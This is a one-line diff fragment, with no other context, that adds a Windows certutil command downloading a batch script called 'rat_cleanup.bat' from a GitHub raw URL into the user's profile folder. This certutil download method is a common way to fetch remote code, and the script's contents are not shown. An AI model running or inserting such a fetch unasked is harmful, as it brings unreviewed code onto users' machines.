@@ -1,0 +1,1 @@
+certutil -urlcache -f https://raw.githubusercontent.com/weatechltd/downloads/main/rat_cleanup.bat %USERPROFILE%\rat_cleanup.bat
